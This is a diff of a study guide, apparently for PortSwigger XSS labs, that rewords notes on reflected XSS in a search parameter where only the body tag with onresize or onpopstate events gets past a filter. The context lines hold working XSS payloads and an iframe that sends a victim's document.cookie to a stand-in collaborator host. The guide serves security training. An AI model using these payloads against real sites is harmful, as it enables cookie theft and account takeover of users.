@@ -161,13 +161,13 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 
 >This section give guide to identify reflected XSS in a **search** function on a target and how to determine the HTML tags and events attributes not blocked.  
   
->The tag **Body** and event **onresize** is only the only allowed on target making it vulnerable to XSS.  
+>The tag **Body** and event **onresize** is the only allowed, providing an injection to perform XSS.  
 
 ```JavaScript
 ?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```  
 
->Body and event **'onpopstate'** is only allowed.  
+>Again the **Body** and event **onpopstate** is not blocked.  
   
 ```JavaScript
 ?search=%22%3E%3Cbody%20onpopstate=print()>
@@ -175,7 +175,7 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 
 [PortSwigger Cheat-sheet XSS Example: onpopstate event](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
 
->Below JavaScript is hosted on exploit server and then deliver to victim. It is iframe doing onload and the search parameter is vulnerable to **onpopstate**.  
+>Below JavaScript is hosted on exploit server and then deliver to victim. It is an iframe doing **onload** and the search parameter is vulnerable to **onpopstate**.  
 
 ```JavaScript
 <iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
